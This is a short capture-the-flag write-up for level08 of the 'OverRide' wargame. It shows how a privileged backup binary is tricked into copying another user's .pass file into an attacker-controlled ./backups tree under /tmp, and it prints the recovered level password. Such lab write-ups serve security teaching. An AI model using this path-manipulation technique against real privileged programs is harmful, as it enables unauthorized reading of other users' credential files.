# level08

In this level, we have a binary that will take a path as 1st argument
```bash
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
```

We will try to give it the path of the next level flag
```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

We can see that it added `./backups/` to the path we gave it. So we will try to execute it from a path where we have `./backups//home/users/level09/.pass`

```bash
level08@OverRide:~$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ touch backups/home/users/level09/.pass 
level08@OverRide:/tmp$ ~/level08 backups/
level08@OverRide:/tmp$ ~/level08 "home/users/level09/.pass"
ERROR: Failed to open ./backups/home/users/level09/.pass
```

It's not working because in the binary, we can see that it is using some specific flags for the open: `O_CREAT  | O_EXCL`
This means that it will create the file if it doesn't exist, but it will fail if it already exists.

So we will delete the .pass file and try again
```bash
level08@OverRide:/tmp$ rm backups/home/users/level09/.pass
level08@OverRide:/tmp$ ~/level08 "/home/users/level09/.pass"
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
